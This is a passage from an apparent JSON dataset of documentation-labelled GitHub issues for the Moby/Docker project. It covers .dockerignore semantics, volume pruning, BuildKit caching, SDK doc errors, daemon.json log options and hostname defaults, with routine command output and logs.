issue further (and open separate tickets where needed)\r\n\r\n#### Some related issues:\r\n\r\n- [ ] https://github.com/moby/moby/issues/40318 Verify parity between .dockerignore and .gitignore syntax\r\n- [ ] https://github.com/moby/moby/issues/30018 Exception patterns in .dockerignore do not support wildcard directories\r\n- [ ] https://github.com/moby/moby/issues/41433 wildcard directories not implemented correctly in dockerignore\r\n- [ ] https://github.com/moby/moby/issues/12843 Global .dockerignore\r\n- [ ] (re)consider nested .dockerignore files https://github.com/moby/moby/issues/20944, and https://github.com/moby/moby/pull/21020#issuecomment-210106299\r\n- [ ] https://github.com/moby/moby/issues/9294 \"Output the reason while cache need to be invalidated on docker build\"\r\n- [ ] https://github.com/moby/moby/issues/15771 COPY with excluded files is not possible\r\n\r\n#### Assorted issues / suggestions / topics\r\n\r\n- Improve performance where possible. Ignoring files should make builds smaller and _faster_, not cause builds to be slow.\r\n    - Would be great if it's possible to profile builds, and see how much time was taken by _excluding_ files. Having this would allow users to make better informed decisions wether or not `.dockerignore` is the right solution.\r\n    - The dockerignore file is often used to make the build-context smaller in order to speed up builds, but with the introduction of BuildKit, some of those may no longer be relevant (and `.dockerignore` could actually have a negative impact in some situations)\r\n- Make `.dockerignore` follow the _exact_ same patterns as `.gitignore` (which it was originally modeled after)\r\n    - `.gitignore` pattern reference: https://git-scm.com/docs/gitignore#_pattern_format\r\n    - if possible, run the .git test-suite / tests to verify this\r\n- Add a global `.dockerignore` to allow excluding common files (`.idea`, `Thumbs.db` files and such). See [moby#12843](https://github.com/moby/moby/issues/12843 Global .dockerignore)\r\n    - allow easy discovery _why_ a file or directory was ignored (which becomes more important if a global ignore file is active). Also see next bullet\r\n- Introduce a command similar to [`git check-ignore`](https://git-scm.com/docs/git-check-ignore) for debugging\r\n    - related: https://github.com/moby/moby/issues/9294 \"Output the reason while cache need to be invalidated on docker build\"\r\n- Note: recursive `.dockerignore` files were proposed at some point, but were considered a risky, breaking change (see https://github.com/moby/moby/issues/20944, and https://github.com/moby/moby/pull/21020#issuecomment-210106299)\r\n    - should this be reconsidered?\r\n- Improve and validate the [`.dockerignore` documentation](https://docs.docker.com/engine/reference/builder/#dockerignore-file)\r\n    - document the per-Dockerfile dockerignore (when using BuildKit and Docker 19.03 or up: https://github.com/moby/moby/issues/12886#issuecomment-480575928, https://github.com/moby/moby/issues/12886#issuecomment-518843764)\r\n    - improve docs by referring to / borrowing from `.gitignore` (where applicable) (see https://github.com/moby/moby/issues/40318 \"BUG: `.dockerignore` sometimes ignores `**`\")\r\n    - could be moved to a separate page if needed\r\n    - provide better examples (also for Windows platforms)\r\n    - best practices (what files to consider for excluding to optimize caching; when to use `.dockerignore`, when *not* to use and (e.g.) use BuildKit, optimize your Dockerfile, use multi-stage builds etc.)\r\n    - common pitfalls\r\n- (related) consider implementing `COPY --exclude` to allow specifying ignore-rules in the Dockerfile itself; this can help with situations where (e.g.) frequently changing files are mixed with \"cacheable\" files (proposal in https://github.com/moby/moby/issues/15771). Allowing such files to be `COPY`'d separately would give more control over layers/caching.\r\n- (Slightly related) improve errors produced due to files that were excluded. The current error for missing files is confusing (as it mentions the file path on the _daemon_ side), therefore making it hard to trace the error back to `.dockerignore` (see the discussion on https://github.com/docker/for-mac/issues/1922, and https://github.com/moby/moby/issues/37605)\r\n\r\n\r\n\r\n"},{"labels":["documentation",null],"text":"**Description**\r\n\r\n`docker volume prune` does not remove dangling bind volumes\r\n\r\n**Steps to reproduce the issue:**\r\n\r\n```\r\n$ docker volume create --name bind_volume --opt type=none --opt device=/tmp --opt o=bind\r\nbind_volume\r\n\r\n$ docker volume inspect bind_volume\r\n[\r\n    {\r\n        \"CreatedAt\": \"2019-10-29T17:41:09Z\",\r\n        \"Driver\": \"local\",\r\n        \"Labels\": {},\r\n        \"Mountpoint\": \"/var/lib/docker/volumes/bind_volume/_data\",\r\n        \"Name\": \"bind_volume\",\r\n        \"Options\": {\r\n            \"device\": \"/tmp\",\r\n            \"o\": \"bind\",\r\n            \"type\": \"none\"\r\n        },\r\n        \"Scope\": \"local\"\r\n    }\r\n]\r\n\r\n$ docker volume ls -f dangling=true\r\nDRIVER              VOLUME NAME\r\nlocal               bind_volume\r\n\r\n$ docker volume prune -f\r\nTotal reclaimed space: 0B\r\n```\r\n\r\n**Describe the results you received:**\r\n\r\nA dangling bind volume is not removed.\r\n\r\n**Describe the results you expected:**\r\n\r\nA dangling bind volume is removed.\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nThe issue happens 100% of time.\r\n\r\n**Workaround**\r\n\r\nFeed the list of dangling volumes to `docker volume rm` manually:\r\n\r\n```\r\n$ docker volume rm $(docker volume ls -qf dangling=true)\r\nOR\r\n$ docker volume ls -qf dangling=true | xargs -r docker volume rm\r\n```\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n$ docker version\r\nClient:\r\n Version:           18.09.2\r\n API version:       1.39\r\n Go version:        go1.10.6\r\n Git commit:        6247962\r\n Built:             Sun Feb 10 04:13:47 2019\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          18.09.2\r\n  API version:      1.39 (minimum version 1.12)\r\n  Go version:       go1.10.6\r\n  Git commit:       6247962\r\n  Built:            Sun Feb 10 03:42:13 2019\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\n$ docker info\r\nContainers: 152\r\n Running: 16\r\n Paused: 0\r\n Stopped: 136\r\nImages: 80\r\nServer Version: 18.09.2\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog\r\nSwarm: active\r\n NodeID: x9jkazxqv6noz8od01g8gzm0h\r\n Is Manager: true\r\n ClusterID: uxkuiv5ijmosd54chjohkfoqe\r\n Managers: 1\r\n Nodes: 1\r\n Default Address Pool: 10.0.0.0/8  \r\n SubnetSize: 24\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 10\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Autolock Managers: false\r\n Root Rotation In Progress: false\r\n Node Address: 192.168.64.1\r\n Manager Addresses:\r\n  192.168.64.1:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: bb71b10fd8f58240ca47fbb579b9d1028eea7c84\r\nrunc version: 2b18fe1d885ee5083ef9f0838fee39b62d653e30\r\ninit version: fec3683\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.15.0-1021-aws\r\nOperating System: Ubuntu 18.04.1 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 15.48GiB\r\nName: ip-172-31-5-235\r\nID: ZG4Q:UHEI:5G7S:6H6I:A22K:YZZX:JUER:TASL:HXB3:CZKZ:WOHK:BDYB\r\nDocker Root Dir: /data/var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\nProduct License: Community Engine\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nTested with docker 18.09.2 and 19.03.4"},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**A mistake in the moby/image/spec/v1.md **\r\n\r\n**Steps to reproduce the issue:**\r\nIt looks like that titles below were swapped in the doc file moby/image/spec/v1.md :\r\n\r\n**Entrypoint array of strings**\r\nA list of arguments to use as the command to execute when the container starts. This value acts as a default and is replaced by an entrypoint specified when creating a container.\r\n\r\n**Cmd array of strings**\r\nDefault arguments to the entry point of the container. These values act as defaults and are replaced with any specified when creating a container. If an Entrypoint value is not specified, then the first entry of the Cmd array should be interpreted as the executable to run.\r\n\r\n**Describe the results you received:\r\n\r\n**\r\n\r\n**Describe the results you expected:\r\n\r\n**\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n(paste your output here)\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\n(paste your output here)\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**"},{"labels":["documentation",null],"text":"The SDK is very unfriendly for beginners.\r\n\r\nApart from the fact every program imports `docker/docker` (including `docker-ce` and `kubernetes`) and that redirects to `moby/moby` on the website, the default version you get from go is `v1.13.1` and people just seem to import specific commits. The releases can not be seen on `moby/moby` but can be found on `docker/engine` however you can not import specific version from there, since other dependencies will crash. \r\n\r\nEven the documentation on the website does not work. This is from https://docs.docker.com/develop/sdk/examples/:\r\n```\r\n\tstatusCh, errCh := cli.ContainerWait(ctx, resp.ID, container.WaitConditionNotRunning)\r\n\tselect {\r\n\tcase err := <-errCh:\r\n\t\tif err != nil {\r\n\t\t\tpanic(err)\r\n\t\t}\r\n\tcase <-statusCh:\r\n\t}\r\n```\r\n`cli.ContainerWait` does not return chans, it returns `(int64, error)` on v1.13.1, and the website does not say how to get other versions of the SDK. Even the documentation on `godoc.org` is wrong since it tells you to get `import \"github.com/docker/docker/client\"` and that will get you `v1.13.1`, which does not return `(<-chan container.ContainerWaitOKBody, <-chan error)` as specified in the documentation.\r\n\r\nAre there any plans to offer some proper documentation and releases so that people can actually use the SDK, without having to dig from git?"},{"labels":["documentation"],"text":"I thought someone forgot to update the docs, but it looks like this might be done on purpose. If this is the former case, I can make a quick PR. However if its the latter, I hope someone will be able to fill me in why this is done this way.\r\n\r\nhttps://github.com/moby/moby/blob/0243936d92ea57f48c6a32beac797ee3b388ba28/api/swagger.yaml#L2246-L2251\r\n\r\nhttps://github.com/moby/moby/blob/be97c66708c24727836a22247319ff2943d91a03/daemon/names/names.go#L5-L9"},{"labels":[null,"documentation",null,null],"text":"When building with `BuildKit`, the `--no-cache` option is (partially) ignored;\r\n\r\nBuild a Dockerfile;\r\n\r\n```bash\r\nDOCKER_BUILDKIT=1 docker build -t bla https://github.com/thaJeztah/go-top.git\r\n[+] Building 29.1s (8/8) FINISHED                                                                                                                                                                                          \r\n => [internal] load git source https://github.com/thaJeztah/go-top.git                                                                                                                                                1.3s\r\n => [internal] load metadata for docker.io/library/golang:1.10-alpine                                                                                                                                                 2.3s\r\n => CACHED [internal] helper image for file operations                                                                                                                                                                0.0s\r\n => [build 1/3] FROM docker.io/library/golang:1.10-alpine@sha256:df75dc8049519981ef51a6e37fe4e79c0cfe9d5a0432ba9b36afe1a1df835f3b                                                                                    17.9s\r\n => => resolve docker.io/library/golang:1.10-alpine@sha256:df75dc8049519981ef51a6e37fe4e79c0cfe9d5a0432ba9b36afe1a1df835f3b                                                                                           0.0s\r\n => => sha256:d830d821f1ea39178886c4853e25ec07369f037cb758e07c3cbab832eabc9a14 1.36kB / 1.36kB                                                                                                                        0.0s\r\n => => sha256:2f577258bd101df535742773fc8d03fe9ea0350e8e132ab55da7dbbc508c89f2 3.80kB / 3.80kB                                                                                                                        0.0s\r\n => => sha256:2d13b02809266f700fe9d5a5002b4b8731fd5c8ff9218240bdc69005e678b158 78.11MB / 78.11MB                                                                                                                     14.3s\r\n => => sha256:0934a9e519360feba9d140548eebdab7cab66c55d04de2bde94a3dffa79a1122 125B / 125B                                                                                                                            1.1s\r\n => => sha256:df75dc8049519981ef51a6e37fe4e79c0cfe9d5a0432ba9b36afe1a1df835f3b 2.04kB / 2.04kB                                                                                                                        0.0s\r\n => => extracting sha256:2d13b02809266f700fe9d5a5002b4b8731fd5c8ff9218240bdc69005e678b158                                                                                                                             2.6s\r\n => => extracting sha256:0934a9e519360feba9d140548eebdab7cab66c55d04de2bde94a3dffa79a1122                                                                                                                             0.0s\r\n => [build 2/3] COPY . .                                                                                                                                                                                              1.6s\r\n => [build 3/3] RUN go install -v ./...                                                                                                                                                                               3.1s\r\n => [stage-1 1/1] COPY --from=build /go/bin/go-top /                                                                                                                                                                  2.7s\r\n => exporting to image                                                                                                                                                                                                0.0s\r\n => => exporting layers                                                                                                                                                                                               0.0s\r\n => => writing image sha256:e7320ea8c5feabd7e31e4f084fd69f52a4a44325caee01beedd6a0d7f004c198                                                                                                                          0.0s\r\n => => naming to docker.io/library/bla                                                                                                                                                                                0.0s\r\n```\r\n\r\nBuild the same image again, but this time with `--no-cache`;\r\n\r\n```bash\r\nDOCKER_BUILDKIT=1 docker build -t bla --no-cache https://github.com/thaJeztah/go-top.git\r\n[+] Building 7.9s (8/8) FINISHED                                                                                                                                                                                           \r\n => CACHED [internal] load git source https://github.com/thaJeztah/go-top.git                                                                                                                                         0.0s\r\n => [internal] load metadata for docker.io/library/golang:1.10-alpine                                                                                                                                                 0.9s\r\n => CACHED [build 1/3] FROM docker.io/library/golang:1.10-alpine@sha256:df75dc8049519981ef51a6e37fe4e79c0cfe9d5a0432ba9b36afe1a1df835f3b                                                                              0.0s\r\n => CACHED [internal] helper image for file operations                                                                                                                                                                0.0s\r\n => [build 2/3] COPY . .                                                                                                                                                                                              1.4s\r\n => [build 3/3] RUN go install -v ./...                                                                                                                                                                               2.7s\r\n => [stage-1 1/1] COPY --from=build /go/bin/go-top /                                                                                                                                                                  2.7s\r\n => exporting to image                                                                                                                                                                                                0.0s\r\n => => exporting layers                                                                                                                                                                                               0.0s\r\n => => writing image sha256:8a8b64198a7f7da426fd5783ae0b0d8958cd154424a060ca2b37a4a17ec0510c                                                                                                                          0.0s\r\n => => naming to docker.io/library/bla                                                                                                                                                                                0.0s\r\n```\r\n\r\nNotice that various steps show `CACHED`\r\n\r\n\r\n\r\nReproduced on Docker 18.09.0;\r\n\r\n```\r\nClient: Docker Engine - Community\r\n Version:           18.09.0\r\n API version:       1.39\r\n Go version:        go1.10.4\r\n Git commit:        4d60db4\r\n Built:             Wed Nov  7 00:47:43 2018\r\n OS/Arch:           darwin/amd64\r\n Experimental:      true\r\n\r\nServer: Docker Engine - Community\r\n Engine:\r\n  Version:          18.09.0\r\n  API version:      1.39 (minimum version 1.12)\r\n  Go version:       go1.10.4\r\n  Git commit:       4d60db4\r\n  Built:            Wed Nov  7 00:55:00 2018\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     true\r\n```"},{"labels":["documentation",null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\ndockerd start failed when daemon config with some log driver options\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1.install docker-ce (17.03 up to latest version) on ubuntu 16.04 LTS\r\n2.config the `/etc/docker/daemon.json` as following:\r\n```\r\n{\r\n  \"log-driver\": \"json-file\",\r\n  \"log-opts\": {\r\n    \"max-size\": \"10m\"\r\n  }\r\n}\r\n```\r\n3.restart dockerd by `sudo service docker restart`, and it works\r\n4.if change `/etc/docker/daemon.json` to:\r\n```\r\n{\r\n  \"log-driver\": \"json-file\",\r\n  \"log-opts\": {\r\n    \"max-size\": \"10m\",\r\n    \"max-file\": 3\r\n  }\r\n}\r\n```\r\nrestart dockerd will get error:\r\n```\r\n-- Subject: Unit docker.socket has begun start-up\r\n-- Defined-By: systemd\r\n-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel\r\n--\r\n-- Unit docker.socket has begun starting up.\r\nNov 21 15:55:58 ubuntu systemd[1]: Listening on Docker Socket for the API.\r\n-- Subject: Unit docker.socket has finished start-up\r\n-- Defined-By: systemd\r\n-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel\r\n--\r\n-- Unit docker.socket has finished starting up.\r\n--\r\n-- The start-up result is done.\r\nNov 21 15:55:58 ubuntu systemd[1]: Starting Docker Application Container Engine...\r\n-- Subject: Unit docker.service has begun start-up\r\n-- Defined-By: systemd\r\n-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel\r\n--\r\n-- Unit docker.service has begun starting up.\r\nNov 21 15:55:58 ubuntu dockerd[16761]: unable to configure the Docker daemon with file /etc/docker/daemon.json\r\nNov 21 15:55:58 ubuntu systemd[1]: docker.service: Main process exited, code=exited, status=1/FAILURE\r\nNov 21 15:55:58 ubuntu systemd[1]: Failed to start Docker Application Container Engine.\r\n-- Subject: Unit docker.service has failed\r\n-- Defined-By: systemd\r\n-- Support: http://lists.freedesktop.org/mailman/listinfo/systemd-devel\r\n--\r\n-- Unit docker.service has failed.\r\n--\r\n-- The result is failed.\r\nNov 21 15:55:58 ubuntu systemd[1]: docker.service: Unit entered failed state.\r\nNov 21 15:55:58 ubuntu systemd[1]: docker.service: Failed with result 'exit-code'.\r\nNov 21 15:55:58 ubuntu sudo[16726]: pam_unix(sudo:session): session closed for user root\r\nNov 21 15:58:35 ubuntu sudo[16769]:   shaoan : TTY=pts/0 ; PWD=/home/shaoan ; USER=root ; COMMAND=/usr/bin/vi\r\nNov 21 15:58:35 ubuntu sudo[16769]: pam_unix(sudo:session): session opened for user root by shaoan(uid=0)\r\nNov 21 16:01:39 ubuntu sudo[16769]: pam_unix(sudo:session): session closed for user root\r\n```\r\n\r\n\r\nIs the parameter `max-file` not supported in in `daemon.json` config? or a bug with docker daemon?\r\n\r\n"},{"labels":["documentation",null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. Go through the [doc](https://github.com/moby/moby/blob/master/docs/contributing/test.md#run-unit-tests)\r\n\r\n\r\n**Describe the results you received:**\r\nAfter issuing:\r\n```\r\n$ TESTDIRS='opts' TESTFLAGS='-test.run ^TestValidateIPAddress$' make test-unit\r\n```\r\nfrom the test documents, I got:\r\n```\r\ncan't load package: package opts: cannot find package \"opts\" in any of:\r\n        /usr/local/go/src/opts (from $GOROOT)\r\n        /go/src/opts (from $GOPATH)\r\nmake: *** [Makefile:161: test-unit] Error 1\r\n```\r\n\r\n**Describe the results you expected:**\r\nHowever I managed to get it to work with:\r\n```\r\n$ TESTDIRS='github.com/docker/docker/opts' TESTFLAGS='-test.run $^TestValidateIPAddress$' make test-unit\r\n```\r\nNote the full path `github.com/docker/docker/opts`. Which is expected since\r\n```\r\n    go test \"${BUILDFLAGS[@]}\" \\\r\n        -cover \\\r\n        -coverprofile=profile.out \\\r\n        -covermode=atomic \\\r\n        $TESTFLAGS \\\r\n        \"${pkg}\"\r\n```\r\nfrom `hack/test/unit` should probably not be issuing `go test opts`.\r\nThis resulted in:\r\n```\r\nok      github.com/docker/docker/opts   0.028s  coverage: 0.0% of statements [no tests to run]                                                                           \r\n```\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:           18.06.1-ce\r\n API version:       1.38\r\n Go version:        go1.11\r\n Git commit:        e68fc7a215\r\n Built:             Fri Sep  7 11:26:59 2018\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer:\r\n Engine:\r\n  Version:          18.06.1-ce\r\n  API version:      1.38 (minimum version 1.12)\r\n  Go version:       go1.11\r\n  Git commit:       e68fc7a215\r\n  Built:            Fri Sep  7 11:26:11 2018\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 1\r\n Running: 1\r\n Paused: 0\r\n Stopped: 0\r\nImages: 83\r\nServer Version: 18.06.1-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: false\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 468a545b9edcd5932818eb9de8e72413e616e86e\r\nrunc version: 69663f0bd4b60df09991c08812a60108003fa340\r\ninit version: fec3683\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.14.70-1-lts\r\nOperating System: Arch Linux\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 7.679GiB\r\nName: colonelthink\r\nID: J6N7:37O7:PQEO:VI7Y:NQAQ:JFJ5:77WR:FFF7:7CF7:MUIC:MZF2:ZVTZ\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n"},{"labels":[null,"documentation",null,null],"text":"There are a HostConfig.DiskQuota option with description \"Disk limit (in bytes).\" on https://docs.docker.com/engine/api/v1.37/#operation/ContainerCreate.\r\n\r\nBut, unfortunately, I can't find any other information about what does it mean. What constrains of use does it have? Is it can be used on all platfroms/storage drivers? What would be if this limit will be exceeded?"},{"labels":[null,"documentation"],"text":"https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#using-pipes\r\n\r\nI think this should mention \r\n\r\n    SHELL [\"/bin/bash\", \"-c\"]\r\n\r\nas an alternative to make `set -o pipefail` work on Debian base images. Using the exec form, especially when you have the need to add pipefail to an existing long RUN sequence, is intrusive and would incur a lot of rewriting work."},{"labels":["documentation",null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/moby/moby/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support for **docker** can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- Slack - community.docker.com #general channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\nGeneral support for **moby** can be found at the following locations:\r\n\r\n- Moby Project Forums - https://forums.mobyproject.org\r\n- Slack - community.docker.com #moby-project channel\r\n- Post a question on StackOverflow, using the Moby tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n**Description**\r\n\r\nFrom documentation:\r\nhttps://docs.docker.com/config/containers/container-networking/#ip-address-and-hostname\r\n> a container’s hostname defaults to be the container’s name in Docker. You can override the hostname using --hostname\r\n\r\nhttps://docs.docker.com/config/containers/container-networking/#dns-services\r\n> --hostname | The hostname a container uses for itself. Defaults to the container’s name if not specified.\r\n\r\nWhen I omit --hostname, I only get container ID as hostname.\r\nThat is either a bug in functionality or in documentation.\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n```\r\n$ docker run --rm --name test1 jayprakashji/ubuntu-network-tools tail -n1 /etc/hosts\r\n172.17.0.3\t91f7517eec46\r\n\r\n$ docker run --rm --name test1 jayprakashji/ubuntu-network-tools ping -c1 test1\r\nping: unknown host\r\n\r\n\r\n$ docker run --rm --name test1 -h test1 jayprakashji/ubuntu-network-tools tail -n1 /etc/hosts\r\n172.17.0.3\ttest1\r\n\r\n$ docker run --rm --name test1 -h test1 jayprakashji/ubuntu-network-tools ping -c1 test1\r\nPING test1 (172.17.0.3): 56 data bytes\r\n64 bytes from 172.17.0.3: icmp_seq=0 ttl=64 time=0.039 ms\r\n--- test1 ping statistics ---\r\n1 packets transmitted, 1 packets received, 0% packet loss\r\nround-trip min/avg/max/stddev = 0.039/0.039/0.039/0.000 ms\r\n```\r\n\r\n**Describe the results you received:**\r\nWithout --hostname (-h), ping is unable to resolve container name.\r\n\r\n**Describe the results you expected:**\r\n\r\nContainer name and hostname are same, so according to mentioned doc, both variants should behave equally.\r\n\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\n Version:           18.06.0-ce\r\n API version:       1.38\r\n Go version:        go1.10.3\r\n Git commit:        0ffa825\r\n Built:             Wed Jul 18 19:11:45 2018\r\n OS/Arch:           linux/amd64\r\n Experimental:      false\r\n\r\nServer:\r\n Engine:\r\n  Version:          18.06.0-ce\r\n  API version:      1.38 (minimum version 1.12)\r\n  Go version:       go1.10.3\r\n  Git commit:       0ffa825\r\n  Built:            Wed Jul 18 19:14:07 2018\r\n  OS/Arch:          linux/amd64\r\n  Experimental:     false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 11\r\n Running: 2\r\n Paused: 0\r\n Stopped: 9\r\nImages: 69\r\nServer Version: 18.06.0-ce\r\nStorage Driver: devicemapper\r\n Pool Name: docker-253:1-5768343-pool\r\n Pool Blocksize: 65.54kB\r\n Base Device Size: 10.74GB\r\n Backing Filesystem: xfs\r\n Udev Sync Supported: true\r\n Data file: /dev/loop0\r\n Metadata file: /dev/loop1\r\n Data loop file: /var/lib/docker/devicemapper/devicemapper/data\r\n Metadata loop file: 